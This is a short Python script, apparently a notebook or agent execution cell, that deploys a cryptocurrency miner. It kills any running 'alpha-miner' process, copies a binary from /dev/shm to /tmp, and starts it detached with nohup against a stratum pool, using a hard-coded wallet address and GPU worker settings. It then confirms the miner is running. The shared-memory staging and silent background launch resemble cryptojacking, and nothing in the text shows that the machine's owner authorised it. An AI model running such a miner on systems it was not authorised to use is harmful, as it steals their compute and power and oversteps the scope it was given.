import subprocess
import os
import shutil
import time as t

W = "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg"
P = "stratum+tcp://sg1.alphapool.tech:5566"
R = "GB10-122GB"
B = "blackwell-native"

subprocess.run(["pkill", "-9", "alpha-miner"], capture_output=True)
t.sleep(1)

src = "/dev/shm/alpha-miner"
dst = "/tmp/alpha-miner"

shutil.copy2(src, dst)
os.chmod(dst, 0o755)

cmd = f"nohup {dst} --pool {P} --address {W} --worker {R} --force-backend {B} > /tmp/alpha.log 2>&1 &"
subprocess.run(["bash", "-c", cmd])
t.sleep(4)

p = subprocess.run(["pgrep", "-a", "alpha-miner"], capture_output=True, text=True)
result = "RUNNING: " + p.stdout.strip()[:100] if p.stdout.strip() else "FAILED"
result
